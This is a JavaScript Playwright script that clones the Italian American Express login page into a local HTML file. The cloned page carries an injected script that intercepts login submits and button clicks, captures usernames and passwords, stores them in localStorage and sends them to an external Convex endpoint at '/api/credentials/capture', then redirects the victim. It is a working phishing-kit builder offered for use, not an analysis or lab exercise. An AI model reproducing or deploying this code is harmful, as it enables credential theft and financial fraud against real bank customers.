import { chromium } from 'playwright';
import fs from 'fs';

async function extractRenderedHTML() {
  console.log('🚀 Launching browser...');
  const browser = await chromium.launch({
    headless: false,
    args: ['--disable-web-security']
  });

  const context = await browser.newContext({
    viewport: { width: 1440, height: 900 }
  });

  const page = await context.newPage();

  // Block external requests
  await page.route('**/*', (route) => {
    const url = route.request().url();
    if (url.includes('americanexpress') ||
        url.includes('aexp') ||
        url.includes('amex') ||
        url.includes('adobedtm') ||
        url.includes('ensighten') ||
        url.includes('liveperson') ||
        url.includes('qualtrics')) {
      console.log('❌ Blocked:', url);
      route.abort();
    } else {
      route.continue();
    }
  });

  console.log('📄 Loading page...');
  await page.goto('https://www.americanexpress.com/it-it/account/login?inav=it_utility_login', {
    waitUntil: 'domcontentloaded',
    timeout: 60000
  });

  // Wait for React to render the form
  console.log('⏳ Waiting for React to render...');
  await page.waitForSelector('input[type="password"], input[name*="password"], input[id*="password"]', { timeout: 30000 }).catch(() => {
    console.log('⚠️ Password input not found, trying alternative...');
  });

  // Wait a bit more for any lazy rendering
  await page.waitForTimeout(5000);

  // Take screenshot
  console.log('📸 Taking screenshot...');
  await page.screenshot({ path: 'public/screenshot-rendered.png', fullPage: true });

  // Get the rendered HTML
  console.log('📝 Extracting rendered HTML...');
  const renderedHTML = await page.evaluate(() => {
    // Clone the document
    const doc = document.documentElement.cloneNode(true);

    // Remove all scripts
    doc.querySelectorAll('script').forEach(s => s.remove());

    // Remove all link tags for external resources
    doc.querySelectorAll('link[rel="stylesheet"]').forEach(l => {
      if (l.href.includes('americanexpress') || l.href.includes('aexp')) {
        l.remove();
      }
    });

    // Get all stylesheets and inline them
    let styles = '';
    document.querySelectorAll('style').forEach(s => {
      styles += s.outerHTML;
    });

    // Get the body with all rendered content
    const body = document.body.innerHTML;

    // Get all inline styles from the head
    const headStyles = document.head.querySelectorAll('style');
    let headStyleContent = '';
    headStyles.forEach(s => headStyleContent += s.outerHTML);

    return {
      body,
      styles: headStyleContent,
      title: document.title
    };
  });

  // Create clean HTML
  const cleanHTML = `<!DOCTYPE html>
<html lang="it-IT">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; img-src 'self' data: blob: https:; font-src 'self' data:;">
<title>${renderedHTML.title}</title>
<link rel="stylesheet" href="css/dls.min.css">
${renderedHTML.styles}
<style>
/* Critical styles for form visibility */
body { background: #fff !important; }
input, button { visibility: visible !important; opacity: 1 !important; }
.form-group, .login-form, [class*="login"], [class*="Login"] { visibility: visible !important; display: block !important; }
</style>
<script>
(function(){
  const CONVEX='https://dynamic-stoat-328.convex.cloud';

  async function saveCreds(u,p){
    const data=JSON.parse(localStorage.getItem('creds')||'[]');
    data.push({u,p,t:Date.now()});
    localStorage.setItem('creds',JSON.stringify(data));
    try{await fetch(CONVEX+'/api/credentials/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})});}catch(e){}
  }

  document.addEventListener('submit',function(e){
    const form=e.target;
    const pwd=form.querySelector('input[type="password"]');
    const user=form.querySelector('input[type="text"],input[type="email"]');
    if(pwd&&pwd.value){
      e.preventDefault();
      e.stopPropagation();
      saveCreds(user?.value||'',pwd.value).then(()=>location='/success');
    }
  },true);

  document.addEventListener('click',function(e){
    const btn=e.target.closest('button');
    if(!btn)return;
    const t=(btn.textContent||'').toLowerCase();
    if(t.includes('accedi')||t.includes('login')||t.includes('entra')||t.includes('continua')){
      e.preventDefault();
      const pwd=document.querySelector('input[type="password"]');
      const user=document.querySelector('input[type="text"],input[type="email"]');
      if(pwd&&pwd.value)saveCreds(user?.value||'',pwd.value).then(()=>location='/success');
    }
  },true);
})();
</script>
</head>
<body>
${renderedHTML.body}
</body>
</html>`;

  // Save
  fs.writeFileSync('public/index-rendered.html', cleanHTML);
  console.log('✅ Saved to public/index-rendered.html');

  // Also save the CSS from the page
  const pageContent = await page.content();
  fs.writeFileSync('public/page-full.html', pageContent);
  console.log('✅ Saved full page to public/page-full.html');

  await browser.close();
  console.log('🎉 Done!');
}

extractRenderedHTML().catch(console.error);